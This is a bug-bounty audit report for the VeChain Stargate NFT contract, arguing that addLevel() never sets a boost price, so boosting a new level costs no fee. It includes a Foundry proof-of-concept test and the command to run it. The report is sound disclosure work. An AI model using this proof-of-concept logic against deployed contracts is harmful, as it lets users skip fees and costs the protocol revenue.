# 59814 sc low stargatenft sol addlevel function not implement updatelevelboostpriceperblock

**Submitted on Nov 16th 2025 at 03:44:19 UTC by @ox9527 for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #59814
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/StargateNFT/StargateNFT.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

From StargateNFT.sol comment:

> All NFT levels have a cap, we are adding 3 new levels at launch, and more levels can be added in the future

The addLevel function:

```solidity
    function addLevel(
        DataTypes.LevelAndSupply memory _levelAndSupply
    ) public onlyRole(LEVEL_OPERATOR_ROLE) {
        Levels.addLevel(_getStargateNFTStorage(), _levelAndSupply);
    }
```

LEVEL\_OPERATOR\_ROLE can add new levels by invoking the addLevel() function. However, when a new level is added, the boostPricePerBlock is not configured. As a result, users can boost the newly added level by calling StargateNFT.sol::boost() without paying any fee, which leads to a loss of expected revenue and breaks the intended fee mechanism.

### Vulnerability Details

Levels.updateLevelBoostPricePerBlock is not configured.

### Impact Details

User pay less fee than expected

## Proof of Concept

{% stepper %}
{% step %}

### PoC — Test contract

Deploy this test contract (found below) which demonstrates adding a level and then minting & boosting without fee due to missing boost price configuration.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {StargateNFT} from "../contracts/StargateNFT/StargateNFT.sol";
import {Stargate} from "../contracts/Stargate.sol";
import {DataTypes} from "../contracts/StargateNFT/libraries/DataTypes.sol";
import "forge-std/console2.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20{
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1e24);
    }
    function transfer(address from, address to, uint256 value) public returns (bool) {
        _update(from, to, value);
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _update(from, to, value);
        return true;
    }
}

contract StargateNFTTest is Test {

    StargateNFT public nft;
    Stargate public stargate;
    MockERC20 public vthoToken;
    function setUp() public {
        // constructor() {
        //    _disableInitializers(); <@ comment _disableInitializers(); on StargateNFT contract >
        // }
        // constructor() {
        //    _disableInitializers(); <@ comment _disableInitializers(); on Stargate contract >
        // }
        vthoToken = new MockERC20("VTHO Token", "VTHO");

        stargate = new Stargate();
        Stargate.InitializeV1Params memory params;
        params.protocolStakerContract = address(0x1234);
        params.admin = address(this);
        params.maxClaimablePeriods = 100;
        params.stargateNFTContract = address(0x5678);
        stargate.initialize(params);

        nft = new StargateNFT();
        DataTypes.StargateNFTInitParams memory nftParams;
        nftParams.tokenCollectionName = "1";
        nftParams.tokenCollectionSymbol = "1";
        nftParams.baseTokenURI = "ipfs://...";
        nftParams.admin = address(this);
        nftParams.upgrader = address(this);
        nftParams.pauser = address(this);
        nftParams.levelOperator = address(this);
        nftParams.legacyNodes = address(this);
        nftParams.stargateDelegation = address(stargate);
        nftParams.vthoToken = address(vthoToken);
        nftParams.legacyLastTokenId = 10;
        DataTypes.LevelAndSupply[] memory levelsAndSupplies = new DataTypes.LevelAndSupply[](2);

        DataTypes.Level memory l;
        l.name = "Level 1";
        l.isX = false;
        l.id = 1;
        l.maturityBlocks = 100;
        l.scaledRewardFactor = 100;
        l.vetAmountRequiredToStake = 1e18;

        DataTypes.Level memory l2;
        l2.name = "Level 2";
        l2.isX = false;
        l2.id = 2;
        l2.maturityBlocks = 100;
        l2.scaledRewardFactor = 100;
        l2.vetAmountRequiredToStake = 1e18;

        levelsAndSupplies[0] = DataTypes.LevelAndSupply({level: l, circulatingSupply: 100, cap: 1000});
        levelsAndSupplies[1] = DataTypes.LevelAndSupply({level: l2, circulatingSupply: 50, cap: 500});
        nftParams.levelsAndSupplies = levelsAndSupplies;
        nft.initialize(nftParams);

        uint8[] memory levelIds = new uint8[](2);
        levelIds[0] = 1;
        levelIds[1] = 2;
        uint256[] memory boostPricesPerBlock = new uint256[](2);
        boostPricesPerBlock[0] = 1e15;
        boostPricesPerBlock[1] = 2e15;
        nft.initializeV3(address(stargate), levelIds, boostPricesPerBlock);
    }

    function test_POC1() public {
        //addLevel.
        DataTypes.Level memory level = DataTypes.Level({
            name: "Level 3",
            isX: false,
            id: 3,
            maturityBlocks: 200,
            scaledRewardFactor: 150,
            vetAmountRequiredToStake: 2e18
        });
        DataTypes.LevelAndSupply memory _levelAndSupply = DataTypes.LevelAndSupply({
            level: level,
            circulatingSupply: 100,
            cap: 1000
        });
        nft.addLevel(_levelAndSupply);

        vm.prank(address(stargate));
        uint256 tokenId = nft.mint(3, address(this));

        //boost.
        nft.boost(tokenId);
    }

    function test_migrateTokenManager() public {
        vm.prank(address(stargate));
        uint256 tokenId = nft.mint(1, address(this));

        nft.grantRole(nft.TOKEN_MANAGER_MIGRATOR_ROLE(), address(this));
        nft.migrateTokenManager(tokenId, address(this));

    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return 0x150b7a02;
    }

}
```

{% endstep %}

{% step %}

### How to run

Run the specific test demonstrating the issue:

```bash
forge test --match-test test_POC1 -v
```

This test shows that after addLevel is called, boost() can be invoked for the new level without the expected boost fee being applied.
{% endstep %}
{% endstepper %}
